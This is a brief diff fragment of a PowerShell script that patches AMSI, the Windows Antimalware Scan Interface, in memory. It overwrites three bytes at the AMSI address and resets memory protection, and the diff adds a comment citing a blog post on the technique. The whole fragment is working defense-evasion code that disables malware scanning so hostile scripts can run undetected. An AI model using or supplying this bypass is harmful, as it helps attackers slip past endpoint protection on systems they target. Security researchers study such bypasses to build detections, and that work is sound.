@@ -35,3 +35,6 @@ $3b = [Byte[]] (0x48, 0x31, 0xc0)
 [System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)
 
 $vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
+
+
+# Blaze patch: https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
